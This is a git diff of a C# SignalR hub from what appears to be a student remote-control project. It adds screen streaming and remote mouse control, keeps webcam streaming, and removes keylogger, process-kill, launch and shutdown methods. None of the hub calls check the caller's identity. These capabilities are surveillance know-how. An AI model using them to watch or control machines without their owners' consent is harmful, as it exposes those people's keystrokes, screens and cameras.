@@ -1,13 +1,11 @@
 ﻿using Microsoft.AspNetCore.SignalR;
 using Microsoft.Extensions.Hosting;
-using server_os.Services;
+using server_os.Services; // <--- QUAN TRỌNG: Phải khớp namespace với 2 file trên
 using System.Collections.Concurrent;
-using System.Linq;
-using System.Threading.Tasks;
+using System.Text.Json.Serialization;
 
 namespace server_os.Hubs
 {
-    // 1. Class lưu thông tin chi tiết của Client
     public class ClientInfo
     {
         public string ConnectionId { get; set; } = "";
@@ -15,238 +13,189 @@ namespace server_os.Hubs
         public string Name { get; set; } = "";
     }
 
+    public class VirtualCursor
+    {
+        public int X { get; set; }
+        public int Y { get; set; }
+        public string ClientId { get; set; } = "";
+    }
+
+    public class ScrollData
+    {
+        [JsonPropertyName("deltaY")]
+        public double DeltaY { get; set; }
+    }
+
     public class SystemHub : Hub
     {
         private readonly KeyloggerService _keylogger;
         private readonly SystemActionService _systemAction;
-        private readonly IHostApplicationLifetime _appLifetime;
         private readonly WebcamService _webcamService;
-        // 2. Thay đổi: Lưu Object ClientInfo thay vì chỉ lưu string tên
+        private readonly ScreenStreamService _screenService;
+        private readonly InputControlService _inputService;
+        private readonly IHostApplicationLifetime _appLifetime;
+        private readonly IHubContext<SystemHub> _hubContext;
+
         private static ConcurrentDictionary<string, ClientInfo> _onlineClients = new ConcurrentDictionary<string, ClientInfo>();
         private static bool _isSystemLocked = false;
+        private static bool _isScreenSharing = false;
+        private static CancellationTokenSource? _screenShareToken;
 
-        public SystemHub(KeyloggerService keylogger, SystemActionService systemAction, WebcamService webcamService, IHostApplicationLifetime appLifetime)
+        // Constructor: Inject các Service
+        public SystemHub(
+            KeyloggerService keylogger,
+            SystemActionService systemAction,
+            WebcamService webcamService,
+            ScreenStreamService screenService,
+            InputControlService inputService,
+            IHostApplicationLifetime appLifetime,
+            IHubContext<SystemHub> hubContext)
         {
             _keylogger = keylogger;
             _systemAction = systemAction;
-            _appLifetime = appLifetime;
             _webcamService = webcamService;
+            _screenService = screenService;
+            _inputService = inputService;
+            _appLifetime = appLifetime;
+            _hubContext = hubContext;
         }
-        // 2. Thêm hàm API cho Client gọi
+
+        // ======================= ULTRAVIEW (SCREEN SHARE) =======================
+        public async Task StartScreenShare()
+        {
+            if (CheckLock()) return;
+            if (_isScreenSharing) return;
+
+            _isScreenSharing = true;
+            _screenShareToken = new CancellationTokenSource();
+            var token = _screenShareToken.Token;
+            string currentClientId = Context.ConnectionId;
+
+            await LogAction("Started UltraView Screen Share");
+
+            _ = Task.Run(async () =>
+            {
+                while (!token.IsCancellationRequested && _isScreenSharing)
+                {
+                    try
+                    {
+                        var base64 = _screenService.CaptureScreenBase64();
+                        if (!string.IsNullOrEmpty(base64))
+                        {
+                            // Gửi sự kiện "ReceiveScreenshot" về Client (khớp với code Frontend)
+                            await _hubContext.Clients.Client(currentClientId).SendAsync("ReceiveScreenshot", base64);
+                        }
+                    }
+                    catch { }
+                    await Task.Delay(50); // ~20 FPS
+                }
+            }, token);
+        }
+
+        public async Task StopScreenShare()
+        {
+            _isScreenSharing = false;
+            _screenShareToken?.Cancel();
+            _inputService.ReleaseModifiers();
+            await LogAction("Stopped UltraView Screen Share");
+        }
+
+        // ======================= INPUT CONTROL =======================
+        // Hàm nhận tọa độ từ Client (đã tính theo pixel) và di chuyển chuột
+        // Client gửi: socket.invoke("SendMouseMove", targetId, x, y)
+        // Chúng ta map nó vào hàm này:
+        public Task SendMouseMove(string targetId, double x, double y)
+        {
+            if (CheckLock()) return Task.CompletedTask;
+            // Lưu ý: Client của bạn đang gửi toạ độ tỉ lệ (0.0-1.0), ta cần nhân với độ phân giải màn hình Server
+            // Tuy nhiên, InputControlService.MoveMouse đang nhận int x, int y trực tiếp (SetCursorPos).
+            // Ta cần sửa lại logic này một chút để khớp.
+            
+            // Giả sử màn hình server là 1920x1080 (hoặc lấy từ Screen.PrimaryScreen)
+            int screenW = 1920; 
+            int screenH = 1080;
+            
+            // Ép kiểu về int pixel
+            int pixelX = (int)(x * screenW);
+            int pixelY = (int)(y * screenH);
+
+            _inputService.MoveMouse(pixelX, pixelY);
+            return Task.CompletedTask;
+        }
+
+        public Task SendMouseClick(string targetId, string button)
+        {
+            if (!CheckLock())
+            {
+                if (button == "left") _inputService.ClickLeft();
+                else if (button == "right") _inputService.ClickRight();
+            }
+            return Task.CompletedTask;
+        }
+
+        public Task SendKeyPress(string targetId, string key)
+        {
+            // Client gửi chuỗi key ("a", "Enter"...), cần map sang byte code nếu InputService nhận byte
+            // Để đơn giản, ta chỉ log hoặc xử lý cơ bản ở đây nếu chưa map
+            return Task.CompletedTask;
+        }
+
+        // ======================= SYSTEM & WEBCAM (GIỮ NGUYÊN) =======================
         public async Task GetWebcams()
         {
             if (CheckLock()) return;
             var list = _webcamService.GetCameraList();
-
-            // Gửi danh sách về cho Client
             await Clients.Caller.SendAsync("ReceiveWebcamList", list);
-            await LogAction("Requested Webcam List");
         }
+
         public async Task StartWebcam(int camIndex)
         {
             if (CheckLock()) return;
-
-            string clientId = Context.ConnectionId;
-
-            // Gọi Service và đưa luôn ID của mình cho nó
-            _webcamService.StartStream(camIndex, clientId);
-
-            await LogAction($"Started Webcam Stream (Cam Index: {camIndex})");
+            _webcamService.StartStream(camIndex, Context.ConnectionId);
+            await LogAction($"Started Webcam Stream (Index: {camIndex})");
         }
 
-        // Sửa lại hàm này
         public async Task StopWebcam()
         {
             _webcamService.StopStream();
             await LogAction("Stopped Webcam Stream");
-        }        // 3. Hàm lấy IP thật của người kết nối
-        private string GetIpAddress()
-        {
-            // Cách mới: Lấy trực tiếp từ HttpContext
-            var httpContext = Context.GetHttpContext();
-            var ip = httpContext?.Connection?.RemoteIpAddress?.ToString();
-
-            // Chuyển đổi IPv6 localhost (::1) thành 127.0.0.1 cho dễ nhìn
-            if (ip == "::1") return "127.0.0.1";
-            return ip ?? "Unknown IP";
         }
 
-        private string GetShortId(string fullId)
-        {
-            return fullId.Length > 4 ? "..." + fullId.Substring(fullId.Length - 4) : fullId;
-        }
-
-        // --- SỰ KIỆN KẾT NỐI ---
+        // ======================= CONNECTION & UTILS =======================
         public override async Task OnConnectedAsync()
         {
             string id = Context.ConnectionId;
             string ip = GetIpAddress();
+            string name = ip == "127.0.0.1" ? "HOST (DASHBOARD)" : $"CLIENT-{id.Substring(0,4)}";
 
-            // Xác định tên: Nếu là localhost thì là HOST (Dashboard), còn lại là Client
-            string name = (ip == "127.0.0.1") ? "HOST (DASHBOARD)" : $"CLIENT-{GetShortId(id)}";
-
-            // Tạo object thông tin
-            var info = new ClientInfo
-            {
-                ConnectionId = id,
-                IpAddress = ip,
-                Name = name
-            };
-
-            // Lưu vào danh sách
-            _onlineClients.TryAdd(id, info);
-
-            // Gửi danh sách MỚI NHẤT (bao gồm cả IP) về cho Dashboard
-            await BroadcastClientList();
-
-            // Gửi trạng thái khóa
+            _onlineClients[id] = new ClientInfo { ConnectionId = id, IpAddress = ip, Name = name };
             await Clients.Caller.SendAsync("UpdateSystemStatus", _isSystemLocked);
-
-            // Ghi log
-            await Clients.All.SendAsync("ReceiveLog", $"[NET] New connection: {name} from {ip}");
-
+            await BroadcastClientList();
             await base.OnConnectedAsync();
         }
 
-        // --- SỰ KIỆN NGẮT KẾT NỐI ---
         public override async Task OnDisconnectedAsync(Exception? exception)
         {
             string id = Context.ConnectionId;
-
-            // Xóa khỏi danh sách
+            _webcamService.StopStream();
+            if (_isScreenSharing) await StopScreenShare();
             _onlineClients.TryRemove(id, out _);
-
-            // Cập nhật lại bảng cho Dashboard
             await BroadcastClientList();
-
-            await Clients.All.SendAsync("ReceiveLog", $"[NET] Disconnected ID: {GetShortId(id)}");
             await base.OnDisconnectedAsync(exception);
         }
 
-        // 4. Hàm gửi danh sách chi tiết
-        private async Task BroadcastClientList()
+        private async Task BroadcastClientList() => await Clients.All.SendAsync("UpdateClientList", _onlineClients.Values.ToList());
+        
+        // Helper: Tương thích với Client cũ (AgentSelector)
+        public async Task GetAgents()
         {
-            // Lấy danh sách các Values (là các object ClientInfo)
-            var clients = _onlineClients.Values.ToList();
-
-            // Gửi nguyên list object này xuống
-            await Clients.All.SendAsync("UpdateClientList", clients);
+             var selfAgent = new [] { new { id = Context.ConnectionId, name = Environment.MachineName, status = "Online" } };
+             await Clients.Caller.SendAsync("UpdateClientList", selfAgent);
         }
 
-        // --- CÁC HÀM CHỨC NĂNG (GIỮ NGUYÊN) ---
-
-        public async Task EmergencyShutdown()
-        {
-            await Clients.All.SendAsync("ReceiveLog", "[CRITICAL] SERVER SHUTTING DOWN...");
-            _ = Task.Run(async () => { await Task.Delay(2000); _appLifetime.StopApplication(); });
-        }
-
-        public async Task ToggleSystemLock(bool isLocked)
-        {
-            _isSystemLocked = isLocked;
-            string status = isLocked ? "LOCKED" : "UNLOCKED";
-            await Clients.All.SendAsync("UpdateSystemStatus", _isSystemLocked);
-            await Clients.All.SendAsync("ReceiveLog", $"[SYSTEM] Status changed to: {status}");
-        }
-
-        // Helper check lock
-        private bool CheckLock()
-        {
-            if (_isSystemLocked)
-            {
-                SendError("System is LOCKED.").Wait();
-                return true;
-            }
-            return false;
-        }
-
-        private async Task LogAction(string msg)
-        {
-            // Lấy tên client hiện tại để ghi log cho đẹp
-            string id = Context.ConnectionId;
-            string name = _onlineClients.ContainsKey(id) ? _onlineClients[id].Name : $"Client-{GetShortId(id)}";
-            await Clients.All.SendAsync("ReceiveLog", $"{name}: {msg}");
-        }
-
-        private async Task SendError(string msg)
-        {
-            await Clients.Caller.SendAsync("ReceiveLog", $"[BLOCKED] {msg}");
-        }
-
-        // --- CLIENT CALLS ---
-        public async Task StartKeylog()
-        {
-            if (CheckLock()) return;
-
-            _keylogger.Start();
-
-            // Báo cho Client biết là đã bắt đầu (nhưng chưa gửi chữ)
-            await LogAction("STARTED Keylogger (Recording mode...)");
-        }
-
-        public async Task StopKeylog()
-        {
-            if (CheckLock()) return;
-
-            _keylogger.Stop();
-
-            // Lấy log từ buffer ra
-            var logs = _keylogger.GetLogs();
-
-            await LogAction("STOPPED Keylogger.");
-
-            // Gửi log về Client (Dùng kênh ReceiveKey để hiện vào khung đen)
-            if (!string.IsNullOrEmpty(logs))
-            {
-                await Clients.All.SendAsync("ReceiveKey", logs);
-            }
-            else
-            {
-                await Clients.All.SendAsync("ReceiveKey", "\n(No data captured)\n");
-            }
-        }
-        public async Task TakeScreenshot()
-        {
-            // 1. Kiểm tra khóa: Nếu bị khóa thì báo lỗi rõ ràng về cho Client
-            if (_isSystemLocked)
-            {
-                await Clients.Caller.SendAsync("ReceiveScreenshotError", "Hệ thống đang bật chế độ bảo vệ (Firewall Locked)!");
-                await LogAction("Blocked Screenshot request due to System Lock.");
-                return;
-            }
-
-            try
-            {
-                // 2. Thử chụp màn hình
-                string base64 = _systemAction.CaptureScreenToBase64();
-
-                // Kiểm tra xem chuỗi trả về có phải thông báo lỗi từ SystemActionService không
-                if (base64.StartsWith("Error"))
-                {
-                    await Clients.Caller.SendAsync("ReceiveScreenshotError", base64);
-                }
-                else
-                {
-                    await Clients.Caller.SendAsync("ReceiveScreenshot", base64);
-                    await LogAction("Requested Screenshot [SUCCESS]");
-                }
-            }
-            catch (Exception ex)
-            {
-                // 3. Nếu crash khi chụp thì cũng báo về để tắt loading
-                await Clients.Caller.SendAsync("ReceiveScreenshotError", "Lỗi Server: " + ex.Message);
-            }
-        }
-        public async Task ShutdownServer() { if (CheckLock()) return; _systemAction.Shutdown(); await LogAction("Sent OS SHUTDOWN"); }
-        public async Task RestartServer() { if (CheckLock()) return; _systemAction.Restart(); await LogAction("Sent OS RESTART"); }
-        public async Task GetProcesses()
-        {
-            if (CheckLock()) return;
-            var list = _systemAction.GetProcessList();
-            await Clients.Caller.SendAsync("ReceiveProcessList", list);
-            await LogAction("Requested Process List");
-        }
-        public async Task KillProcess(int pid) { if (CheckLock()) return; string res = _systemAction.KillProcess(pid); await LogAction(res); }
-        public async Task StartApp(string name) { if (CheckLock()) return; string res = _systemAction.StartProcess(name); await LogAction(res); }
+        private bool CheckLock() => _isSystemLocked;
+        private async Task LogAction(string msg) => await Clients.All.SendAsync("ReceiveLog", msg);
+        private async Task SendError(string msg) => await Clients.Caller.SendAsync("ReceiveLog", $"[BLOCKED] {msg}");
+        private string GetIpAddress() => Context.GetHttpContext()?.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
     }
 }
